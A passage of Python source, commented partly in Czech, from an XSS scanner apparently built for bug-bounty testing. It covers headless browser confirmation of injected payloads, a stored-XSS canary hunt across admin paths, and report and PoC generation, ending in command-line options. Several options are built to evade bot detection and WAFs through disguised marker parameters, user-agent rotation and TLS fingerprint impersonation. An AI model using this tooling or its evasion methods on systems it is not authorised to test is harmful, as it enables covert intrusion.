                            _res = _fut.result()
                            cand = _res[0]
                            verdict = _res[1]
                            err = _res[2]
                            if err:
                                cb["on_log"](
                                    f"[HEADLESS] verify error for "
                                    f"{cand.get('param','?')}: {err}", "warn")
                                continue
                            if verdict is None:
                                continue
                            test_url = _res[3] if len(_res) > 3 else cand.get("url", "")
                            canary = _res[4] if len(_res) > 4 else ""
                            vdict = {
                                "kind":           cand["kind"],
                                "url":            cand["url"],
                                "test_url":       test_url,
                                "param":          cand.get("param", ""),
                                "canary":         canary,
                                "status":         verdict.status.value,
                                "executed":       verdict.executed,
                                "method":         verdict.method,
                                "evidence":       verdict.evidence[:200],
                                "elapsed_ms":     verdict.elapsed_ms,
                                "final_url":      verdict.final_url,
                                "page_errors":    verdict.page_errors[:5],
                                "screenshot_size": (len(verdict.screenshot)
                                                    if verdict.screenshot else 0),
                            }
                            if cand["kind"] == "template_injection":
                                vdict["framework"] = cand.get("framework", "")
                            headless_verdicts.append(vdict)

                            ref = cand.get("result_ref")
                            if isinstance(ref, dict):
                                ref["headless_verdict"] = verdict.status.value
                                ref["headless_executed"] = verdict.executed
                                ref["headless_method"] = verdict.method
                                # ── v10.32: headless verdikt ŘÍDÍ verdikt nálezu ──
                                # Orákulum (reálné Chromium) je ground truth pro
                                # tvrzení "spustí se při přímém načtení této URL".
                                # Dřív byl verdikt jen informativní → TP/FP signál se
                                # zahazoval. Logika je v _apply_headless_verdict (jeden
                                # zdroj pravdy; níže se stejný helper pustí i na emitnuté
                                # hity, protože reflected report bere kopie z
                                # get_emitted_hits(), ne tenhle results-ref).
                                _apply_headless_verdict(
                                    ref, executed=verdict.executed,
                                    status=verdict.status.value,
                                    kind=cand["kind"],
                                    evidence=verdict.evidence,
                                    method=verdict.method)

                            emoji = "🚨" if verdict.executed else (
                                "✗" if verdict.status.value == "not_executed" else "?")
                            cb["on_log"](
                                f"[HEADLESS] {emoji} {cand['kind']:18s} "
                                f"{cand.get('param','?'):16s} → "
                                f"{verdict.status.value} "
                                f"({verdict.method or '—'}, {verdict.elapsed_ms}ms)",
                                "info" if verdict.executed else "debug")

                        # ── mXSS candidates (paralelně) ──
                        _futs2 = {_hv_exe.submit(_verify_mxss, c): c
                                  for c in mxss_to_verify}
                        for _fut in _ac(_futs2):
                            if _cancelled.is_set():
                                break
                            _done_count += 1
                            cb["on_progress"](_done_count, _total_verify)
                            _res = _fut.result()
                            cand = _res[0]
                            verdict = _res[1]
                            err = _res[2]
                            if err:
                                cb["on_log"](
                                    f"[HEADLESS] mXSS verify error: {err}", "warn")
                                continue
                            if verdict is None:
                                continue
                            canary = _res[3] if len(_res) > 3 else ""
                            vdict = {
                                "kind":          "mutation_xss_bypass",
                                "url":           cand["url"],
                                "sanitizer":     cand.get("sanitizer", ""),
                                "payload_name":  cand.get("payload_name", ""),
                                "canary":        canary,
                                "status":        verdict.status.value,
                                "executed":      verdict.executed,
                                "method":        verdict.method,
                                "evidence":      verdict.evidence[:200],
                                "elapsed_ms":    verdict.elapsed_ms,
                            }
                            headless_verdicts.append(vdict)

                            ref = cand.get("result_ref")
                            if isinstance(ref, dict) and verdict.executed:
                                ref.setdefault("verified_bypasses", []).append(
                                    cand.get("payload_name", ""))

                            if verdict.executed:
                                cb["on_log"](
                                    f"[HEADLESS] 🚨 mXSS BYPASS: "
                                    f"{cand.get('payload_name','?')} "
                                    f"bypasses {cand.get('sanitizer','?')} "
                                    f"({verdict.elapsed_ms}ms)", "info")

                        # Close each per-thread browser ON its creating thread while
                        # the pool is still alive — Playwright is thread-affine, so the
                        # main-thread close in the `finally` below only works as a
                        # guarded fallback and otherwise leaks the Chromium subprocess.
                        try:
                            _shutdown_thread_local_browsers(_hv_exe, _hv_tls, _hv_workers)
                        except Exception:
                            pass
                finally:
                    # Fallback: zavři cokoli, co per-thread cleanup nestihl (best-effort;
                    # z hlavního threadu může házet kvůli thread-affinite Playwrightu,
                    # ale to už je jen pojistka — hlavní zavření proběhlo na worker threadu).
                    with _hv_instances_lock:
                        for _hv in _hv_instances:
                            try:
                                _hv.__exit__(None, None, None)
                            except Exception:
                                pass
            # ── Summary ──────────────────────────────────────────────────
            confirmed = sum(1 for v in headless_verdicts if v["executed"])
            rejected = sum(1 for v in headless_verdicts
                           if v["status"] == "not_executed")
            errored = sum(1 for v in headless_verdicts if v["status"] == "error")
            cb["on_log"](
                f"[HEADLESS] verdict: {confirmed} confirmed, "
                f"{rejected} rejected, {errored} errors "
                f"(of {len(headless_verdicts)} verifications)",
                "info"
            )

            # ── v10.32: propsání verdiktu na EMITNUTÉ hity (= co jde do reportu).
            # Reflected report bere kopie z get_emitted_hits(), ne results-ref,
            # takže promote/demote musíme aplikovat i tady, jinak by zůstal jen
            # v results (mimo report). template_injection se propsalo už přes ref.
            try:
                _reconcile_headless_onto_emitted(headless_verdicts, cb)
            except Exception as _e:
                cb["on_log"](
                    f"[HEADLESS] reconcile onto report skipped: {_e}", "warn")

        except Exception as e:
            cb["on_log"](f"[!] Headless verifier phase crashed: {e}", "warn")

    elif not _HEADLESS_VERIFIER_AVAILABLE and headless_verify:
        cb["on_log"](
            "Headless DOM verifier: modul _headless_verifier.py / playwright "
            "not available — skipped", "info"
        )

    # ── v10.39: DOM XSS přes URL fragment (#) — hash-based, čistě klientský ──
    # Google XSS-game level 3: location.hash → img src → jQuery.html breakout.
    # Reflektovaná cesta to nevidí (fragment se neposílá na server); DOM-V6 najde
    # taint flow, ale tady potvrdíme reálnou EXEKUCI breakout payloadem.
    if (headless_verify and _HEADLESS_VERIFIER_AVAILABLE and _HV is not None
            and not _cancelled.is_set()):
        try:
            _frag_urls = list(dict.fromkeys([target] + list(pages or [])))
            cb["on_log"](
                f"[FRAGMENT] hash-based DOM XSS probe: {min(len(_frag_urls),15)} "
                f"pages (location.hash → sink)", "info")
            with _HV(timeout_s=12.0, framework_wait_ms=1000, screenshot=False) as _fhv:
                if getattr(_fhv, "available", False):
                    # v10.40: reflected XSS → breakout synth → headless potvrzení.
                    # Posbírej reflektované (url, param) páry z results (param +
                    # reflexe), syntetizuj breakout a potvrď exec (level-4 typ:
                    # vstup v onload="startTimer('…')" → ');alert()//).
                    try:
                        _refl_pairs = []
                        _refl_seen = set()
                        for _r in results:
                            _p = _r.get("param")
                            _u = _r.get("url")
                            if not _p or not _u:
                                continue
                            if _r.get("source") in ("stored", "open-redirect",
                                                    "dom-fragment"):
                                continue
                            _k = (_normalize_endpoint(_u), _p)
                            if _k in _refl_seen:
                                continue
                            _refl_seen.add(_k)
                            _refl_pairs.append((_u, _p))
                        if _refl_pairs:
                            cb["on_log"](
                                f"[REFLECTED] breakout-synth headless confirmation: "
                                f"{min(len(_refl_pairs),15)} (url,param) pairs", "info")
                        for _u, _p in _refl_pairs[:15]:
                            if _cancelled.is_set():
                                break
                            _rb = _reflected_breakout_confirm(
                                _fhv, session_main, _u, _p, cb,
                                timeout, follow_redirects)
                            for _rf in _rb:
                                _rkey = (_normalize_endpoint(_rf["url"]), _rf["param"])
                                with found_lock:
                                    if _rkey in found_params:
                                        continue
                                    found_params.add(_rkey)
                                _hd = {
                                    "url":     _rf["url"],
                                    "param":   _rf["param"],
                                    "context": f"REFLECTED XSS — breakout confirmed ({_rf['tech']})",
                                    "status":  200,
                                    "source":  "reflected",
                                    "payload": _rf["payload"],
                                }
                                _apply_headless_verdict(
                                    _hd, executed=True, status="executed",
                                    kind="reflected", evidence=_rf["payload"])
                                _emit_hit(cb, _hd)
                    except Exception as _re:
                        cb["on_log"](f"[REFLECTED] breakout confirm skipped: {_re}", "warn")

                    _frag_hits = _fragment_xss_probe(_fhv, _frag_urls, cb)
                    for _fh in _frag_hits:
                        _key = (_fh["url"], "fragment")
                        with found_lock:
                            if _key in found_params:
                                continue
                            found_params.add(_key)
                        _hd = {
                            "url":      _fh["url"],
                            "param":    "url-fragment(#)",
                            "context":  "DOM XSS via URL fragment (location.hash → sink) — headless confirmed",
                            "status":   200,
                            "source":   "dom-fragment",
                            "payload":  _fh["payload"],
                        }
                        _apply_headless_verdict(
                            _hd, executed=True, status="executed",
                            kind="reflected", evidence=_fh["payload"])
                        _emit_hit(cb, _hd)

                    # v10.44: path-segment + header reflected XSS (headless exec)
                    _ph_hits = _path_header_xss_probe(
                        _fhv, session_main, _frag_urls, cb,
                        timeout=timeout, follow_redirects=follow_redirects)
                    for _ph in _ph_hits:
                        _key = (_ph["url"], _ph["kind"])
                        with found_lock:
                            if _key in found_params:
                                continue
                            found_params.add(_key)
                        if _ph["kind"] == "path":
                            _pparam, _pctx, _psrc = (
                                "path-segment",
                                "Reflected XSS via URL path segment — headless confirmed",
                                "dom-path")
                        elif _ph["kind"] == "header":
                            _pparam, _pctx, _psrc = (
                                f"header:{_ph.get('header', '')}",
                                f"Reflected XSS via HTTP header {_ph.get('header', '')} — headless confirmed",
                                "dom-header")
                        elif _ph["kind"] == "cookie":
                            _pparam, _pctx, _psrc = (
                                f"cookie:{_ph.get('cookie', 'xss')}",
                                f"Reflected XSS via cookie {_ph.get('cookie', 'xss')} — headless confirmed",
                                "dom-cookie")
                        else:  # postmessage
                            _pparam, _pctx, _psrc = (
                                "postMessage",
                                "DOM XSS via window.postMessage (message listener → sink) — headless confirmed",
                                "dom-postmessage")
                        _hd = {
                            "url":      _ph["url"],
                            "param":    _pparam,
                            "context":  _pctx,
                            "status":   200,
                            "source":   _psrc,
                            "payload":  _ph["payload"],
                        }
                        _apply_headless_verdict(
                            _hd, executed=True, status="executed",
                            kind="reflected", evidence=_ph["payload"])
                        _emit_hit(cb, _hd)
        except Exception as _fe:
            cb["on_log"](f"[FRAGMENT] probe skipped: {_fe}", "warn")

    # ════════════════════════════════════════════════════════════════════════
    # STORED XSS ROUND-TRIP HUNT PHASE (v9 — multi-canary stored XSS detection)
    # ════════════════════════════════════════════════════════════════════════
    # Tato fáze běží POSLEDNÍ — po všech ostatních fázích, kdy server měl
    # čas commitnout POSTed data do DB. Pro každý registrovaný canary v
    # sx_registry projdeme všechny re-crawlované stránky + common admin paths
    # a hledáme matches.
    #
    # Match (canary v jiné URL než origin) = CONFIRMED stored XSS:
    #   - severity=critical pokud reflection_url je admin/dashboard
    #   - severity=high jinak
    # ════════════════════════════════════════════════════════════════════════
    stored_roundtrip_findings: List[Dict] = []
    if (_STORED_TRACKER_AVAILABLE and stored_roundtrip
            and sx_registry is not None and not _cancelled.is_set()):
        try:
            n_canaries = len(sx_registry)
            if n_canaries == 0:
                cb["on_log"](
                    "[STORED-RT] No canaries in the registry — the previous "
                    "stored phase may not have sent POST requests (enable --stored)",
                    "warn"
                )
            else:
                cb["on_log"](
                    f"Stored XSS round-trip hunt ({n_canaries} canaries)...",
                    "info"
                )
                cb["on_phase"]("stored_roundtrip", {"canaries": n_canaries})

                # Sestav hunt URLs:
                #   1. Všechny crawlované stránky (pages)
                #   2. Target sám
                #   3. Common admin probe paths (relative to target host)
                hunt_urls_set: Set[str] = set()
                hunt_urls_set.add(target)
                for u in (pages or []):
                    hunt_urls_set.add(u)
                # Admin probes — relative to target's hostname
                try:
                    target_parsed = urlparse(target)
                    target_root = (
                        f"{target_parsed.scheme}://{target_parsed.netloc}"
                    )
                    for probe_path in _SX_ADMIN_PROBES:
                        admin_url = target_root + probe_path
                        hunt_urls_set.add(admin_url)
                except Exception:
                    pass

                hunt_urls = sorted(hunt_urls_set)
                MAX_HUNT_URLS = 80
                if len(hunt_urls) > MAX_HUNT_URLS:
                    cb["on_log"](
                        f"[STORED-RT] cap na {MAX_HUNT_URLS} hunt URLs "
                        f"(z {len(hunt_urls)})", "info"
                    )
                    hunt_urls = hunt_urls[:MAX_HUNT_URLS]

                cb["on_log"](
                    f"[STORED-RT] {len(hunt_urls)} URL k re-crawlu "
                    f"(including {sum(1 for u in hunt_urls if _sx_is_admin(u))} "
                    f"admin paths)", "info"
                )

                # Re-crawl + hunt
                hunt_seen: Set[str] = set()  # dedup canary+url pairs
                for idx, url in enumerate(hunt_urls):
                    if _cancelled.is_set():
                        break
                    cb["on_progress"](idx + 1, len(hunt_urls))
                    try:
                        resp = session_workers.get(
                            url, timeout=timeout,
                            allow_redirects=follow_redirects
                        )
                        if resp is None or resp.status_code >= 500:
                            continue
                        html = resp.text or ""
                        if not html:
                            continue
                        sx_findings = _sx_hunt(
                            html, url, sx_registry,
                            exclude_origin=True,
                            response_status=resp.status_code,
                            is_recrawl_phase=True,
                        )
                        for f in sx_findings:
                            dedup_key = (f.canary, f.reflection_url)
                            if dedup_key in hunt_seen:
                                continue
                            hunt_seen.add(dedup_key)

                            finding_dict = {
                                "canary":           f.canary,
                                "origin_url":       f.origin.url,
                                "origin_param":     f.origin.param,
                                "origin_method":    f.origin.method,
                                "origin_payload":   f.origin.payload,
                                "reflection_url":   f.reflection_url,
                                "reflection_status": f.reflection_status,
                                "severity":         f.severity,
                                "is_admin_context": f.is_admin_context,
                                "snippet":          f.snippet,
                            }
                            stored_roundtrip_findings.append(finding_dict)

                            # Emit přes _emit_hit pro GUI
                            sev_label = ("CRITICAL"
                                         if f.is_admin_context else "HIGH")
                            payload_label = (
                                f"STORED canary in {f.reflection_url[:50]}... "
                                f"(origin: {f.origin.param}@{f.origin.url[:40]}...)"
                            )
                            _emit_hit(cb, {
                                "url":      f.origin.url,
                                "param":    f.origin.param,
                                "context":  (f"stored-roundtrip "
                                             f"({sev_label}, "
                                             f"{'admin' if f.is_admin_context else 'public'})"),
                                "csp_note": "",
                                "status":   "STORED",
                                "source":   "stored-roundtrip",
                                "payload":  payload_label,
                                "stored_roundtrip_finding": finding_dict,
                            })
                            cb["on_log"](
                                f"[STORED-RT] 🚨 {sev_label}: canary "
                                f"{f.canary[:16]}... posted to "
                                f"{f.origin.url[:50]}, found in "
                                f"{f.reflection_url[:60]} "
                                f"({'ADMIN' if f.is_admin_context else 'public'})",
                                "info"
                            )
                    except Exception as e:
                        # Network errors per-URL — pokračuj
                        continue

                cb["on_log"](
                    f"[STORED-RT] done: {len(stored_roundtrip_findings)} "
                    f"stored XSS findings "
                    f"({sum(1 for f in stored_roundtrip_findings if f['is_admin_context'])} "
                    f"in admin context)",
                    "info"
                )

        except Exception as e:
            cb["on_log"](
                f"[!] Stored round-trip phase crashed: {e}", "warn"
            )

    elif not _STORED_TRACKER_AVAILABLE and stored_roundtrip:
        cb["on_log"](
            "Stored round-trip: module _stored_xss_tracker.py not available "
            "— skipped", "info"
        )
    elif stored_roundtrip and not enable_stored_scan:
        cb["on_log"](
            "Stored round-trip: requires --stored (no POST requests "
            "were made, nothing to look for)", "info"
        )

    # ── TXT report ────────────────────────────────────────────────────────────
    # v10.16: TXT report je volitelný — když report_path je None, přeskoč
    # (stejně jako HTML/JSON). GUI ho dělá volitelným checkboxem.
    if report_path is None:
        cb["on_log"]("TXT report skipped (not requested)", "info")
    else:
      try:
        seen_report: set = set()
        with report_path.open("w", encoding="utf-8") as fh:
            for entry in results:
                key = (entry["url"], entry["param"])
                if key in seen_report: continue
                seen_report.add(key)
                src = entry.get("source", "seed")
                if src == "fuzz":
                    fh.write(f"{entry['url']}\tparam:{entry['param']}\tsrc:fuzz\tpoc:{entry.get('minimal_poc', '')}\n")
                elif src in ("post", "json", "header"):
                    fh.write(f"{entry['url']}\tparam:{entry['param']}\tsrc:{src}\tstatus:{entry.get('status')}\tpayload:{entry.get('payload', '')}\n")
                elif src in ("postmessage-dynamic", "websocket-dynamic"):
                    fh.write(f"{entry['url']}\tparam:{entry['param']}\tsrc:{src}\tpayload:{entry.get('payload', '')}\tsinks:{entry.get('sinks_hit', [])}\n")
                else:
                    fh.write(f"{entry['url']}\tparam:{entry['param']}\tstatus:{entry.get('status')}\n")

            # Blind XSS summary v TXT reportu
            if blind_xss_injections:
                fh.write("\n═══════════════════════════════════════════════════════════\n")
                fh.write("  BLIND XSS — INJECTED MARKERS\n")
                fh.write("═══════════════════════════════════════════════════════════\n")
                fh.write(f"  Callback URL: {blind_oob_url or '?'}\n")
                fh.write(f"  Total injected: {len(blind_xss_injections)} payloads\n\n")
                for inj in blind_xss_injections[:50]:  # max 50 do TXT
                    fh.write(f"  {inj.get('method','?')}\t{inj.get('url','')}\tparam:{inj.get('param','')}\tmarker:{inj.get('marker','')}\n")
                fh.write("\n  → Check the callback server to confirm hits.\n")
                fh.write("═══════════════════════════════════════════════════════════\n")

            # postMessage summary
            if postmessage_static_findings:
                fh.write("\n═══════════════════════════════════════════════════════════\n")
                fh.write("  postMessage XSS — STATIC ANALYSIS\n")
                fh.write("═══════════════════════════════════════════════════════════\n")
                for pm_f in postmessage_static_findings:
                    fh.write(f"  [{pm_f.get('severity','?')}] {pm_f.get('where','?')}\tsink:{pm_f.get('sink_type','none')}\torigin_check:{pm_f.get('origin_checked', False)}\n")
                fh.write("═══════════════════════════════════════════════════════════\n")

            # WebSocket summary
            if websocket_static_findings:
                fh.write("\n═══════════════════════════════════════════════════════════\n")
                fh.write("  WebSocket XSS — STATIC ANALYSIS\n")
                fh.write("═══════════════════════════════════════════════════════════\n")
                for ws_f in websocket_static_findings:
                    fh.write(f"  [{ws_f.get('severity','?')}] {ws_f.get('where','?')}\tws:{ws_f.get('ws_url','?')}\tsink:{ws_f.get('sink_type','none')}\n")
                fh.write("═══════════════════════════════════════════════════════════\n")
            fh.write(_format_csp_report_section(csp_result))
        cb["on_log"](f"TXT report: {report_path.resolve()}", "info")
      except Exception as e:
        cb["on_log"](f"Error saving the TXT report: {e}", "error")

    # ── JSON report ───────────────────────────────────────────────────────────
    # v10.16: spočítej souhrn (severity breakdown + dedup) jednou, použij
    # v reportu i v logu.
    _scan_summary = summarize_findings()
    _bs = _scan_summary["by_severity"]
    cb["on_log"](
        f"[SUMMARY] {_scan_summary['total']} unique findings "
        f"({_scan_summary['total_raw']} raw) — "
        f"critical:{_bs['critical']} high:{_bs['high']} "
        f"medium:{_bs['medium']} low:{_bs['low']} info:{_bs['info']}",
        "info")
    try:
        _report_dict = {
                "target": target,
                "csp_analysis": csp_result.to_dict(),
                # v10.16: "findings" = jen SKUTEČNÉ nálezy (prošly dedup +
                # gate + render probe) = to co GUI ukazuje. Dřív se sem
                # ukládal `results` = každý reflektující seed kandidát
                # (stovky řádků šumu, payloady bez potvrzeného execu).
                "findings": _enrich_findings_for_report(get_emitted_hits()),
                "findings_count": len(get_emitted_hits()),
                # v10.16: souhrn pro triáž — breakdown podle závažnosti +
                # dedupovaný seznam (stejný endpoint+param+kontext = 1 bug,
                # ne N řádků pro /x?id=1, /x?id=2, ...).
                "summary": _scan_summary,
                "findings_deduped": _enrich_findings_for_report(
                    _scan_summary["deduped_findings"]),
                "dom_static_findings": dom_stat,
                "dom_dynamic_findings": dom_dyn_results,
                "blind_xss_injections": blind_xss_injections,
                "postmessage_static_findings": postmessage_static_findings,
                "postmessage_dynamic_findings": postmessage_dynamic_findings,
                "websocket_static_findings": websocket_static_findings,
                "websocket_dynamic_findings": websocket_dynamic_findings,
                "mutation_xss_findings": mutation_xss_findings,
                "template_injection_findings": template_injection_findings,
                "headless_verdicts": headless_verdicts,
                "dom_v6_findings": dom_v6_findings,
                "static_js_findings": static_js_findings,
                "library_cve_findings": library_cve_findings,
                "trusted_types_findings": trusted_types_findings,
                "stored_roundtrip_findings": stored_roundtrip_findings,
                "proto_pollution_findings": proto_pollution_findings,
                "dom_clobbering_findings": dom_clobbering_findings,
                "ssr_hydration_findings": ssr_hydration_findings,
                "csp_bypass_findings": csp_bypass_findings,
                "open_redirect_findings": open_redirect_findings,
                "emit_stats": get_emit_stats(),
                "timestamp": time.time(),
        }
        # v10.23: Evidence persistence — uloží KAŽDÝ nález ze všech kategorií
        # report_dictu (info→critical) do JSONL storu. Chytá vše bez ohledu
        # na emit kanál (on_hit i fáze, co jdou jen do reportu: PP, template,
        # static_js, postMessage, websocket...). Selhání storu NESMÍ shodit
        # sken — proto best-effort try/except.
        if evidence_store_path:
            try:
                from _finding_store import FindingStore as _FStore
                _fstore = _FStore(
                    path=evidence_store_path,
                    scanner_version=_SCANNER_VERSION,
                    origin=evidence_origin,
                    retention_days=evidence_retention_days,
                    target=target,
                )
                _written = _fstore.ingest_report(_report_dict)
                cb["on_log"](
                    f"[EVIDENCE] {_written} findings saved to "
                    f"{evidence_store_path} (origin={evidence_origin}, "
                    f"scan_id={_fstore.scan_id[:8]})", "info")
            except Exception as _es_err:
                cb["on_log"](f"[EVIDENCE] store failed (best-effort): "
                             f"{_es_err}", "warn")
        # v10.16: JSON report je volitelný — _report_dict se staví vždy (HTML
        # report ho potřebuje), ale na disk zapíšeme jen když je cesta zadaná.
        if json_report is not None:
            with json_report.open("w", encoding="utf-8") as jf:
                json.dump(_report_dict, jf, indent=2, ensure_ascii=False)
            cb["on_log"](f"JSON report: {json_report.resolve()}", "info")
        else:
            cb["on_log"]("JSON report skipped (not requested)", "info")
    except Exception as e:
        cb["on_log"](f"Error saving the JSON report: {e}", "error")
        _report_dict = None

    # ── v10.16: HTML report ───────────────────────────────────────────────────
    # Self-contained klient-ready HTML (severity summary, findings + remediation,
    # CVE tabulka). Staví na stejném report dictu jako JSON. Payloady jsou
    # HTML-escapované, takže report sám nikdy nespustí injektovaný XSS.
    if html_report and _HTML_REPORT_AVAILABLE and _build_html_report is not None:
        try:
            # Když JSON dump selhal, postav dict znovu z aktuálního stavu.
            if _report_dict is None:
                _report_dict = {
                    "target": target,
                    "findings": _enrich_findings_for_report(get_emitted_hits()),
                    "findings_count": len(get_emitted_hits()),
                    "summary": _scan_summary,
                    "findings_deduped": _enrich_findings_for_report(_scan_summary["deduped_findings"]),
                    "library_cve_findings": library_cve_findings,
                }
            _html_str = _build_html_report(_report_dict)
            with open(html_report, "w", encoding="utf-8") as hf:
                hf.write(_html_str)
            cb["on_log"](f"HTML report: {Path(html_report).resolve()}", "info")
        except Exception as e:
            cb["on_log"](f"Error saving the HTML report: {e}", "error")
    elif html_report and not _HTML_REPORT_AVAILABLE:
        cb["on_log"](
            "HTML report requested, but _html_report.py is unavailable "
            "(import failed) — skipped.", "warning")

    # ── SARIF report (v10.17) — standard pro CI/CD (GitHub Code Scanning) ──
    if sarif_report and _SARIF_AVAILABLE and _write_sarif_report is not None:
        try:
            # Stejný _report_dict jako HTML/JSON; postav znovu když chybí.
            if _report_dict is None:
                _report_dict = {
                    "target": target,
                    "findings": _enrich_findings_for_report(get_emitted_hits()),
                    "findings_count": len(get_emitted_hits()),
                    "summary": _scan_summary,
                    "findings_deduped": _enrich_findings_for_report(_scan_summary["deduped_findings"]),
                    "library_cve_findings": library_cve_findings,
                }
            _write_sarif_report(_report_dict, sarif_report)
            cb["on_log"](f"SARIF report: {Path(sarif_report).resolve()}", "info")
        except Exception as e:
            cb["on_log"](f"Error saving the SARIF report: {e}", "error")
    elif sarif_report and not _SARIF_AVAILABLE:
        cb["on_log"](
            "SARIF report requested, but _sarif_report.py is unavailable "
            "(import failed) — skipped.", "warning")

    # ── v10.58: Auto-PoC bundle (bug-bounty-ready) ────────────────────────────
    if poc_report and _POC_AVAILABLE and _write_poc_bundle is not None:
        try:
            if _report_dict is None:
                _report_dict = {
                    "target": target,
                    "findings": _enrich_findings_for_report(get_emitted_hits()),
                    "findings_deduped": _enrich_findings_for_report(
                        _scan_summary["deduped_findings"]),
                    "open_redirect_findings": open_redirect_findings,
                    "stored_roundtrip_findings": stored_roundtrip_findings,
                    "headless_verdicts": headless_verdicts,
                }
            _poc_n = _write_poc_bundle(_report_dict, poc_report)
            cb["on_log"](
                f"PoC bundle: {_poc_n} proof(s) → {Path(poc_report).resolve()}",
                "info")
        except Exception as e:
            cb["on_log"](f"Error saving the PoC bundle: {e}", "error")
    elif poc_report and not _POC_AVAILABLE:
        cb["on_log"](
            "PoC bundle requested, but _poc_generator.py is unavailable "
            "(import failed) — skipped.", "warning")

    # ── Final emit stats summary ──
    _stats = get_emit_stats()
    cb["on_log"](
        f"[GATE] emit stats: emitted={_stats['emitted']} "
        f"dedup_dropped={_stats['dedup_dropped']} "
        f"gate_dropped={_stats['gate_dropped']} "
        f"render_probe={{passed={_stats['render_probe_passed']} "
        f"dropped={_stats['render_probe_dropped']} "
        f"skipped={_stats['render_probe_skipped']}}}",
        "info"
    )

    # ── SPA tip: if SPA fallback was used and 0 hits found, point user to
    # DOM v6 / headless verifier — those are the phases that can find DOM XSS
    # in SPAs (where payload is rendered client-side by Angular/React/Vue).
    if _spa_fallback_used and len(found_params) == 0:
        tips = []
        if not dom_v6_taint:
            tips.append("--dom-v6 (taint analysis with Chromium)")
        if not headless_verify:
            tips.append("--headless-verify (Playwright DOM verification)")
        if tips:
            cb["on_log"](
                f"[SPA] Tip: SPA targets typically have DOM-based XSS that "
                f"only fires in a real browser. For better detection, enable: "
                f"{', '.join(tips)}",
                "info"
            )
        else:
            cb["on_log"](
                "[SPA] Tip: target appears to use server-side sanitization. "
                "Try manual testing with browser DevTools — the search bar / "
                "track-result / redirect are common SPA XSS spots.",
                "info"
            )

    # v10.16: sken doběhl čistě → checkpoint už není potřeba. Smaž ho, ať
    # příští spuštění stejného skenu nezačne "resumovat" hotový sken.
    if _ckpt is not None and not _cancelled.is_set():
        try:
            _ckpt.clear()
            cb["on_log"]("[RESUME] Scan complete — checkpoint deleted.", "info")
        except Exception:
            pass

    # v10.39: 'hits' v done fázi musí odrážet SKUTEČNÉ nálezy v reportu (DOM-V6,
    # mXSS, headless, static-JS, PP… se neemitují přes found_params), jinak GUI
    # banner ukazuje "0 HITS" i když report má N nálezů (mátlo to na level 3).
    try:
        _final_hits = len(get_emitted_hits())
    except Exception:
        _final_hits = len(found_params)
    cb["on_phase"]("done", {"hits": max(_final_hits, len(found_params)),
                            "elapsed": time.perf_counter() - start})
    return list(found_params)
 
def main():
    try:
        print(logo)
    except NameError:
        pass  # logo constant not defined — skip banner

    parser = argparse.ArgumentParser(description="xss_grenade.py — fast, smart XSS detection.")
    parser.add_argument("--target", "-t", required=False, default=None)
    parser.add_argument("--payloads", type=str, default="payloads.txt")
    parser.add_argument("--thread", "-w", type=int, default=DEFAULT_WORKERS,
                        help=f"Worker threads (default {DEFAULT_WORKERS}). The "
                             f"connection pool scales to match. Values >500 are "
                             f"clamped (diminishing returns + resource cost).")
    parser.add_argument("--timeout", type=float, default=DEFAULT_TIMEOUT)
    parser.add_argument("--sleep", type=float, default=DEFAULT_SLEEP)
    parser.add_argument("--no-verify", action="store_true")
    parser.add_argument("--limit-urls", type=int, default=None)
    parser.add_argument("--limit-payloads", type=int, default=None)
    parser.add_argument("--early-exit", action="store_true")
    parser.add_argument("--canary", action="store_true")
    parser.add_argument("--marker", action="store_true")
    parser.add_argument("--marker-param", default="_",
                        help="Name of the marker parameter. Default '_' looks like a cache-buster "
                             "(a common pattern) and won't reveal an automated scanner. "
                             "Don't use '__mx' — some WAFs block it.")
    parser.add_argument("--verbose", "-v", action="store_true")
    parser.add_argument("--report", default="xss_report.txt")
    parser.add_argument("--json-report", default="xss_report.json")
    parser.add_argument("--rotate-ua", action="store_true",
                        help="Per-request rotation of the UA + coherent headers (sec-ch-ua, Accept-*)")
    parser.add_argument("--ua-rotate-every", type=int, default=5,
                        help="Rotate the UA every N requests (default 5 — burst mode, "
                             "simulates a real user)")
    parser.add_argument("--ua-file", type=Path, default=None,
                        help="Custom UA pool from a user file (one UA per line, "
                             "# comments). Takes priority over a fresh fetch.")
    parser.add_argument("--no-ua-fresh", action="store_true",
                        help="Don't download a live UA pool (offline mode). Uses the hardcoded "
                             "DEFAULT_USER_AGENTS or --ua-file.")
    parser.add_argument("--target-country", type=str, default=None,
                        help="ISO country code (CZ/DE/JP/...) for the Accept-Language hint. "
                             "Boosts the given language 8× in the rotation so the locale matches "
                             "the target's geo IP.")
    parser.add_argument("--cffi-impersonate", type=str, default=None,
                        choices=[None, "rotate"] + CURL_CFFI_PROFILES,
                        help="Browser TLS+HTTP2 impersonation via curl_cffi. "
                             "Recommended for Cloudflare/Akamai targets. "
                             "Requires: pip install curl_cffi. "
                             "Profile: chrome131, firefox133, safari18_0, edge131, ... "
                             "(NOTE: when curl_cffi is installed, chrome131 is "
                             "now used automatically even without this flag.) "
                             "v10.14: use 'rotate' for per-session JA3 rotation "
                             "(scanner uses 3 sessions main/probe/workers — "
                             "each gets a different UA-consistent profile, "
                             "so the target sees 3 distinct browser fingerprints).")
    parser.add_argument("--legacy-tls", action="store_true",
                        help="Opt-in: requests TLS path offers a permissive "
                             "ClientHello (ALL:@SECLEVEL=0 + TLSv1) to reach "
                             "ancient servers with broken TLS. Produces a "
                             "NON-browser JA3 — only use when the target "
                             "genuinely requires it. No effect on the "
                             "curl_cffi path.")
    parser.add_argument("--no-warmup", action="store_true",
                        help="v10.14: Disable origin warm-up sequence "
                             "(robots.txt + favicon.ico + homepage). Default: "
                             "warm-up is ENABLED — simulates browser-like "
                             "initial requests before the attack to make the "
                             "scan less obvious to bot-detection systems. "
                             "Disable for fastest possible scan (single-target, "
                             "no anti-bot concerns).")
    parser.add_argument("--no-cors-scan", action="store_true",
                        help="v10.14: Disable CORS misconfiguration scan. "
                             "Default: enabled — non-destructive scan that "
                             "detects ACAO reflection, null origin bypass, "
                             "suffix/prefix bypasses. CWE-942.")
    parser.add_argument("--no-crlf-scan", action="store_true",
                        help="v10.14: Disable CRLF injection scan. "
                             "Default: enabled — non-destructive scan that "
                             "sends %%0d%%0a payloads in URL params and "
                             "checks for header/body reflection. CWE-93.")
    parser.add_argument("--no-xssi-scan", action="store_true",
                        help="v10.14: Disable XSSI (Cross-Site Script "
                             "Inclusion) scan. Default: enabled — "
                             "non-destructive scan that detects JSONP "
                             "callback reflection, JS-parseable JSON "
                             "arrays, missing nosniff. CWE-829.")
    parser.add_argument("--ssrf-scan", action="store_true",
